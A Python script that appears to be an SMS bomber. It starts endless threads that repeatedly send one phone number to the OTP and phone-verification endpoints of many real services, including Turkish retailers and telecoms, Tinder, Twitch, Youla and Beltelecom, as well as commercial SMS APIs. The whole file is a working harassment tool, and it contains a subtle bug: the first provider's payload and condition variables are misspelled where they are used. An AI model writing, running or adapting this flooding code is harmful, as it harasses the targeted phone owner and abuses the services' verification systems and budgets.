import os
import time
import threading
import requests

class SMSProvider:
    def __init__(self, name, url, payload, condition, headers=None, cooldown=5):
        self.name = name
        self.url = url
        self.payload = payload
        self.condition = condition
        self.headers = headers
        self.cooldown = cooldown

    def send_sms(self):
        try:
            if self.condition():
                response = requests.post(self.url, json=self.payload, headers=self.headers)
                if response.status_code == 200:
                    print(f"[{self.name}] SMS sent successfully.")
                else:
                    print(f"[{self.name}] Failed to send SMS. Status Code: {response.status_code}")
            else:
                print(f"[{self.name}] Condition not met for sending SMS.")
        except Exception as e:
            print(f"[{self.name}] Error: {e}")

    def start_worker(self):
        while True:
            self.send_sms()
            time.sleep(self.cooldown)

def run_in_thread(provider):
    thread = threading.Thread(target=provider.start_worker)
    thread.daemon = True
    thread.start()

# API configurations and payloads
otmobil_payload = { "phone": "1234567890" }
otmobil_condition = lambda: True

baydoner_payload = { "phone": "1234567890" }
baydoner_condition = lambda: True

netgsm_payload = { "phone": "1234567890" }
default_condition = lambda: True

twilio_payload = { "phone": "1234567890", "message": "Hello from Twilio" }
twilio_condition = lambda: True

nexmo_payload = { "phone": "1234567890" }
nexmo_condition = lambda: True

messagebird_payload = { "phone": "1234567890" }
messagebird_condition = lambda: True

plivo_payload = { "phone": "1234567890" }
plivo_condition = lambda: True

telnyx_payload = { "phone": "1234567890" }
telnyx_condition = lambda: True

clicksend_payload = { "phone": "1234567890" }
clicksend_condition = lambda: True

sinch_payload = { "phone": "1234567890" }
sinch_condition = lambda: True

textmagic_payload = { "phone": "1234567890" }
textmagic_condition = lambda: True

telesign_payload = { "phone": "1234567890" }
telesign_condition = lambda: True

bulksms_payload = { "phone": "1234567890" }
bulksms_condition = lambda: True

smsglobal_payload = { "phone": "1234567890" }
smsglobal_condition = lambda: True

clickatell_payload = { "phone": "1234567890" }
clickatell_condition = lambda: True

turkcell_payload = { "phone": "1234567890" }
turkcell_condition = lambda: True

turktelekom_payload = { "phone": "1234567890" }
turktelekom_condition = lambda: True

boyner_payload = { "phone": "1234567890" }
boyner_condition = lambda: True

morhipo_payload = { "phone": "1234567890" }
morhipo_condition = lambda: True

carrefoursa_payload = { "phone": "1234567890" }
carrefoursa_condition = lambda: True

gratis_payload = { "phone": "1234567890" }
gratis_condition = lambda: True

koton_payload = { "phone": "1234567890" }
koton_condition = lambda: True

youla_payload = { "phone": "1234567890" }
youla_condition = lambda: True

tinder_payload = { "phone": "1234567890" }
tinder_condition = lambda: True

mygames_payload = { "phone": "1234567890" }
mygames_condition = lambda: True

beltelecom_payload = { "phone": "1234567890" }
beltelecom_condition = lambda: True

twitch_payload = { "phone": "1234567890" }
twitch_condition = lambda: True

# SMS Providers List
providers = [
    SMSProvider("Otomobil", "https://www.otomobil.com.tr/api/auth/send-otp", otomobil_payload, otomobil_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Baydoner", "https://b2c-api.baydoner.com.tr/api/v1/auth/send-otp", baydoner_payload, baydoner_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("NetGSM", "https://api.netgsm.com.tr/sms/send/otp", netgsm_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Twilio", "https://api.twilio.com/2010-04-01/Accounts/{}/Messages.json".format(os.getenv("TWILIO_SID", "default_sid")), twilio_payload, twilio_condition, headers={"Authorization": "Basic {}".format(os.getenv("TWILIO_AUTH", "default_auth")), "Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
    SMSProvider("Nexmo", "https://rest.nexmo.com/sms/json", nexmo_payload, nexmo_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("MessageBird", "https://rest.messagebird.com/messages", messagebird_payload, messagebird_condition, headers={"Authorization": "AccessKey {}".format(os.getenv("MESSAGEBIRD_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Plivo", "https://api.plivo.com/v1/Account/{}/Message/".format(os.getenv("PLIVO_AUTH_ID", "default_id")), plivo_payload, plivo_condition, headers={"Authorization": "Basic {}".format(os.getenv("PLIVO_AUTH_TOKEN", "default_token")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Telnyx", "https://api.telnyx.com/v2/messages", telnyx_payload, telnyx_condition, headers={"Authorization": "Bearer {}".format(os.getenv("TELNYX_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("ClickSend", "https://rest.clicksend.com/v3/sms/send", clicksend_payload, clicksend_condition, headers={"Authorization": "Basic {}".format(os.getenv("CLICKSEND_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Sinch", "https://messagingapi.sinch.com/v1/sms", sinch_payload, sinch_condition, headers={"Authorization": "Bearer {}".format(os.getenv("SINCH_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("TextMagic", "https://rest.textmagic.com/api/v2/messages", textmagic_payload, textmagic_condition, headers={"X-TM-Username": os.getenv("TEXTMAGIC_USERNAME", "default_user"), "X-TM-Key": os.getenv("TEXTMAGIC_API_KEY", "default_key"), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("TeleSign", "https://rest-api.telesign.com/v1/messaging", telesign_payload, telesign_condition, headers={"Authorization": "Basic {}".format(os.getenv("TELESIGN_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("BulkSMS", "https://api.bulksms.com/v1/messages", bulksms_payload, bulksms_condition, headers={"Authorization": "Basic {}".format(os.getenv("BULKSMS_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("SMSGlobal", "https://api.smsglobal.com/v1/sms/", smsglobal_payload, smsglobal_condition, headers={"Authorization": "Bearer {}".format(os.getenv("SMSGLOBAL_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Clickatell", "https://platform.clickatell.com/messages", clickatell_payload, clickatell_condition, headers={"Authorization": "Bearer {}".format(os.getenv("CLICKATELL_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Turkcell", "https://api.turkcell.com.tr/auth/send-otp", turkcell_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("TurkTelekom", "https://api.turktelekom.com.tr/auth/send-otp", turktelekom_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Boyner", "https://www.boyner.com.tr/v2/customer/register/otp", boyner_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Morhipo", "https://www.morhipo.com/customer/register/otp", morhipo_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("CarrefourSA", "https://api.carrefoursa.com/auth/send-otp", carrefoursa_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Gratis", "https://www.gratis.com/api/register/send-otp", gratis_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Koton", "https://www.koton.com/api/auth/send-otp", koton_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Youla", "https://youla.ru/web-api/auth/request_code", youla_payload, youla_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Tinder", "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms", tinder_payload, tinder_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("MyGames", "https://auth.api.mygames.com/v1/send-otp", mygames_payload, mygames_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Beltelecom", "https://my.beltelecom.by/api/v1/auth/send-otp", beltelecom_payload, beltelecom_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Twitch", "https://passport.twitch.tv/phone_verification/send", twitch_payload, twitch_condition, headers={"Content-Type": "application/json"}, cooldown=5)
]

# Start worker threads for all providers
for provider in providers:
    run_in_thread(provider)

# Keep main thread alive
while True:
    time.sleep(1)
